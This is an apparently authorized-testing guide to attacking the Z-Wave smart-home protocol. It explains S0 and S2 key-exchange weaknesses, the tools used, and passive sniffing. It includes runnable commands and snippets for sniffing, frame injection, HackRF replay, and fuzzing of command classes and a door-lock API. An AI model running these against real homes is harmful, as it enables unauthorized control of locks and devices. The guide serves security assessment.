# 🔐 Z-Wave Protocol — Complete Penetration Testing Guide
### End-to-End: From Protocol Fundamentals → Full Attack Surface Coverage

> **⚠️ Legal Disclaimer:** This guide is intended solely for authorized security researchers, IoT security professionals, and developers performing assessments on hardware and networks they own or have written permission to test. Unauthorized interception, jamming, or injection of Z-Wave signals may violate the Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA), FCC regulations, and equivalent laws in your jurisdiction. Always obtain written authorization before testing. This document references publicly disclosed, peer-reviewed research from DEF CON, Black Hat, Pen Test Partners, and academic institutions.

---

## 📋 Table of Contents

1. [Understanding Z-Wave — Deep Protocol Internals](#1-understanding-z-wave--deep-protocol-internals)
2. [Network Architecture & Topology](#2-network-architecture--topology)
3. [Security Frameworks: S0, S2, SmartStart](#3-security-frameworks-s0-s2-smartstart)
4. [Attack Surface Overview](#4-attack-surface-overview)
5. [Hardware Tools for Penetration Testing](#5-hardware-tools-for-penetration-testing)
6. [Software Tools & Frameworks](#6-software-tools--frameworks)
7. [Pre-Engagement & Scoping](#7-pre-engagement--scoping)
8. [Phase 1 — Passive Reconnaissance & Sniffing](#8-phase-1--passive-reconnaissance--sniffing)
9. [Phase 2 — Active Network Discovery](#9-phase-2--active-network-discovery)
10. [Phase 3 — Cryptographic & Key Exchange Attacks](#10-phase-3--cryptographic--key-exchange-attacks)
11. [Phase 4 — Protocol-Level Attacks](#11-phase-4--protocol-level-attacks)
12. [Phase 5 — Replay Attacks](#12-phase-5--replay-attacks)
13. [Phase 6 — Denial of Service Attacks](#13-phase-6--denial-of-service-attacks)
14. [Phase 7 — Firmware & OTA Analysis](#14-phase-7--firmware--ota-analysis)
15. [Phase 8 — Physical Layer Attacks](#15-phase-8--physical-layer-attacks)
16. [Phase 9 — Gateway & Controller Exploitation](#16-phase-9--gateway--controller-exploitation)
17. [Phase 10 — Z-Wave Long Range (ZWLR) Testing](#17-phase-10--z-wave-long-range-zwlr-testing)
18. [Test Case Matrix](#18-test-case-matrix)
19. [CVEs, Known Vulnerabilities & Research](#19-cves-known-vulnerabilities--research)
20. [Reporting & Remediation Guidance](#20-reporting--remediation-guidance)
21. [Lab Setup Guide](#21-lab-setup-guide)
22. [Legal & Ethical Framework](#22-legal--ethical-framework)
23. [References & Trusted Sources](#23-references--trusted-sources)

---

## 1. Understanding Z-Wave — Deep Protocol Internals

### 1.1 What is Z-Wave?

Z-Wave is a low-power, sub-GHz wireless mesh networking protocol designed specifically for smart home and building automation. It was originally developed by Zensys in 1999, acquired by Sigma Designs in 2008, and subsequently by Silicon Laboratories (Silicon Labs) in 2018. In 2022, Silicon Labs open-sourced the Z-Wave specification, and the Z-Wave Alliance became the Standards Development Organization (SDO).

**Key distinguishing characteristics:**
- Sub-1 GHz radio (less crowded than 2.4 GHz Wi-Fi/Bluetooth/Zigbee)
- Proprietary mesh protocol (ITU G.9959 ratified standard)
- Hardware-level interoperability certification required
- Maximum 232 nodes per network (NodeID is 8-bit, 1–232)
- Range: 30m indoors, 100m outdoors, up to 4km+ with Z-Wave Long Range (ZWLR)

### 1.2 Frequency Bands by Region

| Region | Frequency | Notes |
|--------|-----------|-------|
| USA/Canada | 908.42 MHz | Primary channel |
| Europe (EU) | 868.42 MHz | Primary; ZWLR-EU to shift to 864/866 MHz per ETSI (2025) |
| Australia/NZ | 921.42 MHz | |
| Japan | 922.5 / 923.9 / 926.3 MHz | 3-channel system |
| India | 865.2 MHz | |
| Russia | 869.0 MHz | |
| Israel | 916.0 MHz | |
| Hong Kong | 919.82 MHz | |
| Z-Wave Long Range (US) | 912.0 MHz / 920.0 MHz | Channel A and B |
| Z-Wave Long Range (EU) | 864.0 MHz / 866.0 MHz | Transitioning per 2024B-3 spec |

> **Pentester Note:** Testing in the wrong frequency band will yield no results. Know your target geography before setting up your SDR.

### 1.3 Protocol Stack (OSI-equivalent layers)

```
┌──────────────────────────────────────────────────────┐
│  Application Layer  │  Command Classes (CCs)          │
│                     │  e.g., SWITCH_BINARY, DOOR_LOCK │
├──────────────────────────────────────────────────────┤
│  Security Layer     │  S0 (AES-128 OFB/CBC-MAC)       │
│                     │  S2 (ECDH + AES-128 CCM)        │
│                     │  SPAN (Singlecast Pre-shared     │
│                     │  Absolute Nonce)                 │
├──────────────────────────────────────────────────────┤
│  Transport Layer    │  Sequencing, fragmentation,      │
│                     │  acknowledgement (ACK)            │
├──────────────────────────────────────────────────────┤
│  Network Layer      │  HomeID + NodeID routing,        │
│                     │  mesh path calculation           │
├──────────────────────────────────────────────────────┤
│  MAC Layer          │  Frame construction, CRC,        │
│                     │  CSMA/CA channel access          │
├──────────────────────────────────────────────────────┤
│  Physical Layer     │  FSK modulation, 9.6/40/100 kbps │
│                     │  Manchester encoding (Gen 1-4)   │
│                     │  Z-Wave LR: OFDM, up to 100 kbps │
└──────────────────────────────────────────────────────┘
```

### 1.4 Frame Structure (Z-Wave MAC Frame)

```
 0         1         2         3         4    5         6+      Last 2
┌─────────┬─────────┬─────────┬─────────┬────┬─────────┬───────┬──────┐
│ HomeID  │ Src     │ Frame   │ Length  │Dst │ Payload │  ...  │ CRC  │
│ 4 bytes │ NodeID  │ Control │ 1 byte  │ID  │         │       │2 byte│
│         │ 1 byte  │ 2 bytes │         │    │         │       │      │
└─────────┴─────────┴─────────┴─────────┴────┴─────────┴───────┴──────┘
```

**HomeID:** 4-byte unique identifier for each Z-Wave network — critical for targeting  
**NodeID:** 8-bit (1–232) — identifies each device in the network  
**Frame Control:** Routed/unrouted flag, acknowledge required, speed bits  
**CRC:** 2-byte checksum on entire frame; forged frames failing CRC are discarded

### 1.5 Modulation & Data Rates

| Generation | Modulation | Data Rate | Notes |
|------------|-----------|-----------|-------|
| Gen 1-2 | FSK (R1) | 9.6 kbps | Legacy, still deployed |
| Gen 3 | FSK (R2) | 40 kbps | Enhanced range |
| Gen 4-5 | FSK (R3) | 100 kbps | 500 series chips |
| Gen 6+ (700/800 series) | FSK | 100 kbps | Enhanced power mgmt |
| Z-Wave Long Range | OFDM | up to 100 kbps | 4km+ range |

### 1.6 Command Classes (CCs) — Application Layer

Command Classes define the functionality exposed by each device. Testers must understand these to craft meaningful attacks.

**High-value/high-risk CCs for penetration testing:**

| Command Class | Hex | Purpose | Risk |
|---------------|-----|---------|------|
| COMMAND_CLASS_DOOR_LOCK | 0x62 | Lock/unlock doors | CRITICAL |
| COMMAND_CLASS_SECURITY | 0x98 | S0 security encapsulation | HIGH |
| COMMAND_CLASS_SECURITY_2 | 0x9F | S2 security encapsulation | HIGH |
| COMMAND_CLASS_ALARM | 0x71 | Security alarm status | HIGH |
| COMMAND_CLASS_SWITCH_BINARY | 0x25 | On/off control | MEDIUM |
| COMMAND_CLASS_THERMOSTAT_MODE | 0x40 | HVAC control | MEDIUM |
| COMMAND_CLASS_FIRMWARE_UPDATE_MD | 0x7A | OTA firmware updates | HIGH |
| COMMAND_CLASS_INCLUSION_CONTROLLER | 0x74 | Node inclusion | HIGH |
| COMMAND_CLASS_NETWORK_MANAGEMENT | 0x34 | Network topology | HIGH |
| COMMAND_CLASS_USER_CREDENTIAL | 0x83 | PIN/credential management (2024A) | CRITICAL |
| COMMAND_CLASS_ASSOCIATION | 0x85 | Device associations | MEDIUM |
| COMMAND_CLASS_MULTI_CHANNEL | 0x60 | Multi-endpoint devices | LOW |
| COMMAND_CLASS_BASIC | 0x20 | Basic on/off (unauthenticated) | MEDIUM |
| COMMAND_CLASS_MANUFACTURER_SPECIFIC | 0x72 | Device info (unauthenticated) | INFO |
| COMMAND_CLASS_VERSION | 0x86 | Firmware versions (unauthenticated) | INFO |

---

## 2. Network Architecture & Topology

### 2.1 Node Types

**Primary Controller (NodeID 1):**
- The "brain" — assigns NodeIDs, holds routing tables
- Only one primary controller per HomeID
- Compromise of the primary controller = total network takeover
- Examples: Z-Wave hubs (SmartThings, Vera, Home Assistant with USB stick)

**Secondary Controller:**
- Can route and manage devices but cannot assign NodeIDs
- Rare in consumer installs

**Routing Slave / End Device:**
- Sensor, actuator (lock, switch, thermostat)
- Can relay traffic (routing slave) or only communicate with controller (pure slave)
- Battery-powered devices go to sleep and use Wakeup CC

**Bridge Controller:**
- Used for Z/IP (Z-Wave over IP) gateway configurations
- Exposes Z-Wave network to IP network — important attack pivot

### 2.2 Mesh Network Operation

Z-Wave uses source routing — the controller calculates the route and embeds it in the frame. Each packet can traverse up to 4 hops. A pentester intercepting traffic at any hop can analyze routing tables.

```
Controller ──── Router A ──── Router B ──── Target Device
   NodeID:1      NodeID:3      NodeID:7       NodeID:12
   [HomeID embedded in every frame broadcast]
```

**SmartStart (2019+):** Devices include a DSK (Device Specific Key) QR code for automated, pre-authenticated inclusion. If an attacker obtains the DSK, they can attempt to join as the device during setup.

---

## 3. Security Frameworks: S0, S2, SmartStart

### 3.1 S0 Security (2008) — BROKEN

S0 is the first-generation Z-Wave security framework using AES-128 in OFB mode with CBC-MAC for authentication.

**Critical S0 Vulnerability (disclosed 2013, CVE not assigned — proprietary protocol):**

During device inclusion (pairing), the network key is transmitted encrypted using a hardcoded all-zeros key:
```
Encryption Key for key exchange: 0x00000000000000000000000000000000
```

Any attacker within RF range during inclusion can capture and decrypt the network key exchange. Once the network key is obtained, ALL S0 traffic is permanently decryptable.

**Additional S0 weaknesses:**
- Single network key for all devices (no key segmentation)
- Nonce replay vulnerabilities in early implementations
- Message sequencing does not prevent all replay attacks
- High overhead: requires 3 frames per encrypted application frame (Nonce Get → Nonce Report → Encrypted frame)

### 3.2 S2 Security (2016) — Current Standard (mandatory since April 2, 2017)

S2 fundamentally redesigned key exchange using:
- **ECDH (Elliptic Curve Diffie-Hellman):** Key exchange cannot be intercepted passively
- **AES-128-CCM:** Combined encryption + authentication
- **SPAN (Singlecast Pre-shared Absolute Nonces):** Eliminates the 3-frame nonce handshake
- **MPAN (Multicast Pre-shared Absolute Nonces):** For multicast S2 traffic
- **CTR_DRBG:** Cryptographically secure pseudo-random nonce generation

**S2 Security Classes (Access Control Keys):**
```
┌─────────────────────────────────────────────────────────────────┐
│ Security Class      │ Use Case                │ Risk if Obtained │
├─────────────────────────────────────────────────────────────────┤
│ S2 Access Control  │ Door locks, garage doors │ CRITICAL         │
│ S2 Authenticated   │ Sensors with auth PIN    │ HIGH             │
│ S2 Unauthenticated │ Low-security devices     │ MEDIUM           │
│ S0                 │ Legacy backward compat.  │ HIGH (breakable) │
└─────────────────────────────────────────────────────────────────┘
```

**S2 Bootstrapping Process:**
1. Controller initiates inclusion, broadcasts Add Node Start
2. Device sends Node Info Frame (NIF) — **UNENCRYPTED and UNAUTHENTICATED**
3. KEX Get/Report exchanged (key capabilities negotiation) — **UNENCRYPTED**
4. ECDH public key exchange
5. Optional: User enters 5-digit DSK for authenticated mode
6. Keys transferred encrypted with negotiated ECDH shared secret

**The Z-Shave Downgrade Vulnerability:** Step 2 is unauthenticated. The NIF containing `COMMAND_CLASS_SECURITY_2` (0x9F) can be spoofed by an attacker to remove S2 capability, forcing S0 pairing.

### 3.3 SmartStart (2019+)

SmartStart allows zero-touch provisioning via QR code (containing the 128-bit DSK). The controller automatically includes devices when they appear on the network if their DSK is pre-loaded.

**SmartStart security considerations:**
- DSK on QR code label is a high-value target — photographing it grants inclusion rights
- Man-in-the-Middle during SmartStart provisioning can capture DSK
- Supply-chain risk: devices shipped with known/leaked DSKs

---

## 4. Attack Surface Overview

```
                          ┌─────────────────────────────────┐
                          │        ATTACK SURFACE MAP        │
                          └─────────────────────────────────┘

RF Layer ──────────────── Passive Sniffing (HomeID discovery)
                          Active Network Scanning (NodeID enum)
                          Jamming / RF Interference (DoS)
                          Signal Replay

Pairing/Inclusion ──────── S0 Key Interception (during pairing)
                          S2→S0 Downgrade (Z-Shave)
                          SmartStart DSK Theft
                          Rogue Controller Inclusion

Cryptographic ──────────── S0 Nonce Exhaustion
                          CTR_DRBG Desynchronization (S2 DoS)
                          Weak Nonce Prediction (legacy)
                          Network Key Extraction from NVRAM

Protocol Logic ─────────── Unencrypted Command Class Abuse
                          Node Info Spoofing
                          HomeID Cloning
                          Routing Table Poisoning

Firmware/OTA ───────────── Unsigned OTA Updates
                          Downgrade to Vulnerable Firmware
                          JTAG/UART Extraction

Gateway/IP Layer ────────── Z/IP Gateway API Exploitation
                          Web Interface Vulnerabilities
                          MQTT Broker Attacks
                          Z-Wave JS API Abuse

Physical ────────────────── Chip Decapping & Key Extraction
                          NVRAM Key Dumping
                          Debug Interface Abuse (JTAG/SWD)
```

---

## 5. Hardware Tools for Penetration Testing

### 5.1 Software-Defined Radios (SDRs)

#### 🥇 HackRF One (Primary Recommended)
- **Manufacturer:** Great Scott Gadgets
- **Frequency Range:** 1 MHz – 6 GHz (covers all Z-Wave bands)
- **Transmit/Receive:** Full-duplex capable (half-duplex hardware, software-selectable)
- **Sample Rate:** Up to 20 MSPS
- **Price:** ~$340 USD
- **Use Case:** Sniffing, packet injection, replay attacks, EZ-Wave framework
- **GitHub:** https://github.com/mossmann/hackrf
- **Required for:** EZ-Wave, Scapy-radio, waving-z transmit mode
- **Note:** Default EZ-Wave configuration requires **two** HackRF One units (one TX, one RX)

```bash
# Install HackRF tools on Kali/Ubuntu
sudo apt-get install hackrf
hackrf_info    # Verify device detection
hackrf_transfer -r capture.cs8 -f 908420000 -s 2000000  # Capture at US frequency
```

#### 🥈 RTL-SDR (Budget Option, Receive Only)
- **Manufacturer:** Various (NooElec, RTL-SDR Blog)
- **Frequency Range:** 500 kHz – 1.75 GHz (covers Z-Wave)
- **Transmit:** NO — receive only
- **Sample Rate:** Up to 3.2 MSPS
- **Price:** ~$25–$35 USD
- **Use Case:** Passive sniffing, signal identification, waving-z receive mode
- **Limitation:** Cannot transmit — cannot do injection, replay, or active attacks
- **Best paired with:** waving-z, rtl_zwave, Gqrx for visualization

```bash
# Install RTL-SDR tools
sudo apt-get install rtl-sdr
rtl_test -t    # Test device
rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u  # EU Z-Wave capture
```

#### 🥉 YARD Stick One
- **Manufacturer:** Great Scott Gadgets
- **Frequency Range:** Sub-1 GHz (300–928 MHz — ideal for Z-Wave)
- **Transmit/Receive:** Yes (half-duplex)
- **Price:** ~$100 USD
- **Use Case:** Targeted sub-1 GHz Z-Wave attacks, replay attacks
- **Software:** RFCat Python library
- **Advantage:** Better sensitivity at sub-1 GHz than HackRF; lower cost for Z-Wave-only work

```bash
pip install rfcat
rfcat -r    # Interactive mode
# Then use Python to interact with Z-Wave frequencies
```

#### Ettus USRP B200/B210
- **Manufacturer:** Ettus Research (National Instruments)
- **Frequency Range:** 70 MHz – 6 GHz
- **Transmit/Receive:** Full duplex
- **Price:** $686–$1,119 USD
- **Use Case:** High-fidelity research, protocol development, academic testing
- **Software:** GNU Radio, UHD drivers
- **Best for:** Advanced research requiring precision, simultaneous TX/RX

#### LimeSDR Mini
- **Manufacturer:** Lime Microsystems
- **Frequency Range:** 10 MHz – 3.5 GHz
- **Transmit/Receive:** Full duplex
- **Price:** ~$160 USD
- **Use Case:** Cost-effective HackRF alternative with full duplex
- **Software:** GNU Radio, LimeSuite

#### bladeRF 2.0 Micro
- **Manufacturer:** Nuand
- **Frequency Range:** 47 MHz – 6 GHz
- **Transmit/Receive:** Full duplex, 2×2 MIMO
- **Price:** ~$480 USD
- **Use Case:** High-performance simultaneous monitoring + injection

### 5.2 Dedicated Z-Wave Hardware

#### Silicon Labs UZB-7 (ZMEUUZB7) / UZB Stick
- **Type:** USB Z-Wave controller stick
- **Chip:** EFR32ZG14 (700 series) or ZGM130 (800 series)
- **S2 Support:** Yes (700/800 series)
- **SmartStart:** Yes
- **Z-Wave LR:** Yes (with 800-series firmware)
- **Price:** ~$35–$60 USD
- **Use Case:** Z-Wave network inclusion/exclusion, Zniffer mode, passive packet capture
- **Legitimate Tool Source:** Z-Wave.Me, Silicon Labs, Aeotec
- **Required Software:** Z-Wave PC Controller, Z-Wave Zniffer, Home Assistant, OpenZWave

```bash
# Identify UZB port
ls /dev/ttyUSB*   # Linux
# Use with Home Assistant / Z-Wave JS
```

#### Z-Wave.Me RaZberry Shield (for Raspberry Pi)
- **Type:** GPIO-connected Z-Wave radio for Raspberry Pi
- **Chip:** ZGM130 (800 series)
- **S2 Support:** Yes
- **Use Case:** Fully controllable Z-Wave controller for testing lab setup
- **GPIO Pins Used:** 4 pins (TX, RX, GND, 3.3V)
- **Works With:** All Raspberry Pi models with 40-pin GPIO (Pi 1 through Pi 5)
- **Software:** Z-Way (licensed), Home Assistant Z-Wave JS

#### Aeotec Z-Stick Gen7 (ZW090)
- **Type:** USB Z-Wave controller
- **Chip:** ZGM130 700 series
- **Price:** ~$45 USD
- **Use Case:** Testing lab, network exploration, legitimate authorized testing controller

#### Silicon Labs WSTK Pro Development Kit
- **Type:** Professional developer kit
- **Use Case:** **Z-Wave Long Range Zniffer** (currently the only supported ZWLR sniffer)
- **Connectivity:** Ethernet + USB required simultaneously for ZWLR sniffing
- **Price:** ~$200–$300 USD
- **Note:** Required for ZWLR penetration testing — no alternative currently available

#### Nortek HUSBZB-1 (Combo Z-Wave + Zigbee)
- **Type:** USB dual-radio stick
- **Use Case:** Testing environments with mixed Z-Wave/Zigbee deployments
- **Price:** ~$40 USD

### 5.3 Hardware for Firmware Analysis

| Tool | Purpose | Price |
|------|---------|-------|
| J-Link Pro | JTAG/SWD debugging, firmware extraction | ~$400+ |
| SEGGER J-Link EDU | JTAG for educational/research | ~$60 |
| Bus Pirate | UART/SPI/I2C protocol analysis | ~$30 |
| Logic Analyzer (Saleae/clone) | Digital signal capture for UART/SPI | ~$15–$400 |
| Hot air rework station | Chip desoldering for decapping | ~$50–$300 |
| CH341A Programmer | SPI/I2C flash reading | ~$15 |
| Raspberry Pi (any) | Z-Wave testing controller via RaZberry | ~$35–$80 |

### 5.4 Recommended Pentesting Hardware Kit (3 Tiers)

**Budget (~$200):**
- RTL-SDR Blog v4 dongle (~$35)
- YARD Stick One (~$100)
- Aeotec Z-Stick Gen7 (~$45)
- Raspberry Pi 4 (~$35) + SD card

**Professional (~$700):**
- HackRF One × 2 (~$680)
- Silicon Labs UZB-7 stick (~$50)
- RaZberry Shield (~$45)
- Bus Pirate (~$30)
- J-Link EDU (~$60)

**Research-Grade (~$2,000+):**
- Ettus USRP B210 (~$1,119)
- HackRF One (~$340)
- Silicon Labs WSTK Pro Kit (~$250)
- Full Saleae Logic Pro 16 (~$1,000)
- All Z-Wave development kits

---

## 6. Software Tools & Frameworks

### 6.1 Signal Capture & Analysis

#### EZ-Wave (Primary Z-Wave Testing Framework)
- **GitHub:** https://github.com/AFITWiSec/EZ-Wave (original: https://github.com/cureHsu/EZ-Wave)
- **Presented At:** ShmooCon 2016 by Joseph Hall & Ben Ramsey (AFIT)
- **Language:** Python (built on Scapy-radio)
- **Requirements:** GNU Radio, Scapy-radio, 2× HackRF One
- **Capabilities:**
  - `ezstumbler.py` — Passive/active network discovery (HomeID, NodeIDs)
  - `ezrecon.py` — Device enumeration, Command Class discovery
  - `ezfingerprint.py` — Device type identification
  - Packet capture and injection via GNU Radio flowgraphs
  - Included Wireshark Z-Wave dissector

```bash
# Clone and install EZ-Wave
git clone https://github.com/AFITWiSec/EZ-Wave
cd EZ-Wave
sudo ./install.sh

# Passive network stumbling (30 seconds)
python ezstumbler.py -p -t 30

# Active scan on a known HomeID
python ezstumbler.py -a -t 60 --homeid 0x1a2b3c4d

# Recon specific node
python ezrecon.py --homeid 0x1a2b3c4d --nodeid 5 -t 30
```

#### Scapy-Radio (BastilleResearch Fork)
- **GitHub:** https://github.com/BastilleResearch/scapy-radio
- **Presented At:** Black Hat USA 2014
- **Language:** Python + GNU Radio
- **Use Case:** Z-Wave packet crafting, decoding, and injection using Python Scapy syntax
- **Z-Wave Layer:** Includes full Z-Wave frame parsing in `scapy/layers/ZWave.py`

```python
# Example: Craft and send a Z-Wave Basic Set ON command
from scapy.all import *
load_contrib('zwave')

# Build Z-Wave frame (unencrypted BASIC SET ON to NodeID 5)
pkt = ZWave(homeid=0x1a2b3c4d, src=0x01, dst=0x05) / \
      ZWaveReq(cmd_class=0x20, cmd=0x01, data=[0xFF])

# Transmit via GNU Radio socket
send(pkt)
```

#### Waving-Z (ITU G.9959 Modulator/Demodulator)
- **GitHub:** https://github.com/baol/waving-z
- **Language:** C++
- **Compatible Hardware:** RTL-SDR (receive), HackRF One (transmit + receive)
- **Use Case:** Low-level frame encoding/decoding for G.9959; replay attack tool

```bash
# Build waving-z
git clone https://github.com/baol/waving-z
cd waving-z && mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release && cmake --build .

# Receive Z-Wave frames (EU 868 MHz) with RTL-SDR
rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u

# Capture to file for replay
rtl_sdr -f 908420000 -s 2000000 -g 40 - | ./wave-in > capture.log

# Transmit/replay Z-Wave frame with HackRF
./wave-out -p 'd6 b2 62 08 01 41 03 0d 07 25 01 ff' > frame.cs8
hackrf_transfer -t frame.cs8 -f 908420000 -s 2000000 -x 40
```

#### RTL-Zwave / andersesbensen/rtl-zwave
- **GitHub:** https://github.com/andersesbensen/rtl-zwave
- **Language:** C (predecessor to waving-z)
- **Use Case:** Basic Z-Wave frame reception with RTL-SDR

#### GNU Radio
- **Website:** https://www.gnuradio.org
- **Language:** Python + C++ blocks via GNU Radio Companion (GRC)
- **Use Case:** Signal processing backbone for all SDR-based Z-Wave tools
- **Minimum Version:** GNU Radio 3.8+ recommended

```bash
# Install GNU Radio on Ubuntu/Kali
sudo apt-get install gnuradio gr-osmosdr
```

### 6.2 Z-Wave Network Management Tools (Dual Use: Legitimate + Research)

#### Z-Wave PC Controller (Silicon Labs)
- **Type:** Official Silicon Labs Windows GUI tool
- **Use Case:** Network inclusion/exclusion, Command Class testing, configuration
- **Download:** Via Silicon Labs Simplicity Studio (free registration required)
- **Legitimate Use:** Device provisioning, S2 pairing testing
- **Security Research Use:** Forcing specific security levels during pairing testing

#### Z-Wave Zniffer (Silicon Labs)
- **Type:** Official packet analyzer (Windows)
- **Use Case:** Passive Z-Wave packet capture and decoding using UZB/WSTK
- **Download:** Via Silicon Labs Simplicity Studio
- **Key Feature:** Decrypts S0 traffic when network key is known; shows S2 metadata
- **ZWLR Support:** Requires WSTK Pro Kit + Ethernet connection
- **Bishop Fox Tutorial:** https://bishopfox.com/blog/set-up-zniffer-for-z-wave

#### Z-Wave JS / node-zwave-js
- **GitHub:** https://github.com/zwave-js/node-zwave-js
- **Language:** TypeScript/Node.js
- **Use Case:** Programmatic Z-Wave network control via USB stick
- **Security Research Use:** Scripted node interrogation, CC enumeration, fuzzing
- **REST API:** Available via Z-Wave JS UI (Docker-deployable)

```bash
# Run Z-Wave JS UI via Docker
docker run -it -p 8091:8091 -p 3000:3000 \
  --device=/dev/ttyUSB0:/dev/ttyUSB0 \
  zwavejs/zwave-js-ui:latest
# Access at http://localhost:8091
```

#### OpenZWave / python-openzwave
- **GitHub:** https://github.com/OpenZWave/open-zwave (NOTE: UNMAINTAINED)
- **Status:** Deprecated — use Z-Wave JS instead
- **Historical use:** Widely deployed in Home Assistant/Domoticz; may be present in target systems

#### Home Assistant Z-Wave Integration
- **URL:** https://www.home-assistant.io/integrations/zwave_js/
- **Use Case:** Full Z-Wave network dashboard — useful for authorized network assessment
- **Research Value:** Reveals all node capabilities, neighbors, routing topology visually

### 6.3 Wireshark Dissectors

#### Z-Wave Wireshark Dissector (built-in since Wireshark 1.12)
```bash
# Capture Z-Wave via pipe from waving-z / EZ-Wave
wireshark -k -i <pipe>

# Or open .pcap captured from Zniffer
# Wireshark auto-detects Z-Wave frames
# Set key for S0 decryption:
# Edit → Preferences → Protocols → Z-Wave → Network Key
```

Z-Wave frames appear as `ZWAVE` protocol in Wireshark. The EZ-Wave toolkit includes a custom enhanced dissector.

### 6.4 Fuzzing Tools

#### Boofuzz (Network Protocol Fuzzer)
- **GitHub:** https://github.com/jtpereyda/boofuzz
- **Language:** Python
- **Use Case:** Fuzzing Z-Wave Command Classes via an authorized gateway's API

```python
# Example: Fuzz DOOR_LOCK command parameters via Z-Wave JS API
import requests
import random

base_url = "http://localhost:8091/api/zwave/nodes/5/set_value"
for i in range(1000):
    payload = {"commandClassName": "Door Lock", 
               "value": random.randint(0, 255)}
    requests.post(base_url, json=payload)
```

#### Custom Python Fuzzer via Scapy-Radio
```python
# Fuzz frame lengths and payloads
from scapy.all import *
load_contrib('zwave')

for cmd_class in range(0x00, 0xFF):
    for cmd in range(0x00, 0xFF):
        pkt = ZWave(homeid=TARGET_HOMEID, src=0x01, dst=TARGET_NODE) / \
              ZWaveReq(cmd_class=cmd_class, cmd=cmd, data=[0x00])
        send(pkt)
```

### 6.5 Miscellaneous Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Gqrx | SDR spectrum visualization | https://gqrx.dk |
| SDR# (SDRSharp) | Windows SDR analysis | https://airspy.com/download/ |
| Universal Radio Hacker (URH) | RF protocol analysis & reverse engineering | https://github.com/jopohl/urh |
| rfcat | YARD Stick One Python library | https://github.com/atlas0fd00m/rfcat |
| Z-Wave Alliance CTT | Official compliance test tool | https://z-wavealliance.org |
| Simplicity Studio | Silicon Labs IDE with Z-Wave SDK | https://www.silabs.com/developers/simplicity-studio |
| Binwalk | Firmware analysis/extraction | https://github.com/ReFirmLabs/binwalk |
| Firmwalker | Firmware security scanner | https://github.com/craigz28/firmwalker |
| checksec | Binary hardening analysis | https://github.com/slimm609/checksec.sh |

---

## 7. Pre-Engagement & Scoping

### 7.1 Rules of Engagement Checklist

Before any Z-Wave penetration test, obtain written authorization covering:

```
[ ] Written authorization from device/network owner
[ ] Defined HomeIDs / network boundaries in scope
[ ] Physical locations where RF testing is permitted
[ ] Time windows for active testing
[ ] Exclusions (e.g., do not test door locks during occupied hours)
[ ] Emergency stop procedure
[ ] Data handling agreement for captured traffic
[ ] Notification to building management if required
[ ] Frequency licensing confirmation (FCC Part 15 in US = unlicensed, testing OK on own equipment)
[ ] Legal review of jurisdiction-specific regulations
```

### 7.2 Threat Modeling

Use the STRIDE model applied to Z-Wave:

| STRIDE Category | Z-Wave Threat |
|-----------------|--------------|
| **S**poofing | Cloning HomeID/NodeID, rogue controller |
| **T**ampering | Injecting commands, modifying firmware |
| **R**epudiation | Non-attributable RF commands |
| **I**nformation Disclosure | S0 key interception, traffic sniffing |
| **D**enial of Service | NonceGet flooding, RF jamming |
| **E**levation of Privilege | S2→S0 downgrade, gaining primary controller role |

### 7.3 Information Gathering (OSINT)

Before active testing, gather:
- **FCC ID lookup:** Search https://fccid.io for target device — reveals internal photos, schematic fragments, test reports, RF frequency used
- **Z-Wave device database:** https://products.z-wavealliance.org — reveals all certified devices, their supported Command Classes, security levels
- **CVE database:** Search `z-wave` at https://cve.mitre.org and https://nvd.nist.gov
- **Vendor security advisories:** Check manufacturer websites for known firmware vulnerabilities
- **Z-Wave JS device database:** https://devices.zwave-js.io — fingerprint data

---

## 8. Phase 1 — Passive Reconnaissance & Sniffing

### 8.1 Setup for Passive Capture

**Hardware setup (RTL-SDR, receive-only, stealthy):**
```bash
# Step 1: Determine regional frequency
# US: 908.42 MHz | EU: 868.42 MHz | AU: 921.42 MHz

# Step 2: Capture raw IQ samples
rtl_sdr -f 908420000 -s 2000000 -g 40 capture.raw

# Step 3: Pipe to Z-Wave decoder
rtl_sdr -f 908420000 -s 2000000 -g 40 - | ./wave-in -u | tee zwave_capture.txt

# Step 4: Visualize spectrum
gqrx   # Tune to 908.42 MHz, zoom into Z-Wave channels
```

**Hardware setup (HackRF One):**
```bash
# Capture at higher sample rate for analysis
hackrf_transfer -r capture.cs8 -f 908420000 -s 8000000 -l 32 -g 40

# Pipe directly to decoder
hackrf_transfer -r /dev/stdout -f 908420000 -s 2000000 2>/dev/null | \
  ./wave-in -u | tee zwave_frames.txt
```

### 8.2 What to Look For in Captured Frames

**Every Z-Wave frame reveals:**
- `HomeID` — Identifies the target network (4 bytes, e.g., `0x1A2B3C4D`)
- `Source NodeID` — Originating device
- `Destination NodeID` — Target device (or broadcast `0xFF`)
- `Command Class` + `Command` — What action is being performed
- `Security encapsulation` — Whether frame is S0, S2, or unencrypted

**High-value frames to identify:**
```
Unencrypted COMMAND_CLASS_DOOR_LOCK → Device not using security!
COMMAND_CLASS_SECURITY (0x98)       → S0 device present
COMMAND_CLASS_SECURITY_2 (0x9F)     → S2 device present
Node Info Frame during inclusion    → Device capabilities exposed
Nonce Get/Report frames             → S0 nonce exchange (sniff for key replay)
```

### 8.3 EZ-Wave Passive Stumbling

```bash
cd EZ-Wave

# Passive scan — just listen, don't transmit
python ezstumbler.py --passive --timeout 120

# Output example:
# [+] Discovered HomeID: 0x1a2b3c4d
# [+] NodeID 1 (Controller) detected
# [+] NodeID 5 detected (COMMAND_CLASS_DOOR_LOCK)
# [+] NodeID 7 detected (COMMAND_CLASS_SWITCH_BINARY)
```

### Test Cases — Phase 1

| TC-001 | Passive HomeID Identification |
|--------|------------------------------|
| **Objective** | Identify all Z-Wave HomeIDs within RF range |
| **Method** | Passive SDR sniffing — no transmission |
| **Tool** | waving-z + RTL-SDR OR EZ-Wave passive mode |
| **Expected Finding** | HomeID, active NodeIDs, traffic patterns |
| **Risk** | Info gathering — enables all subsequent attacks |
| **Pass Criteria** | Tester can identify target HomeID within 60 seconds |

| TC-002 | Unencrypted Traffic Detection |
|--------|------------------------------|
| **Objective** | Identify devices sending unencrypted commands |
| **Method** | Capture and parse all frames; flag frames without S0/S2 encapsulation |
| **Tool** | Z-Wave Zniffer OR waving-z + Wireshark |
| **Expected Finding** | BASIC, MANUFACTURER_SPECIFIC, VERSION frames are always unencrypted |
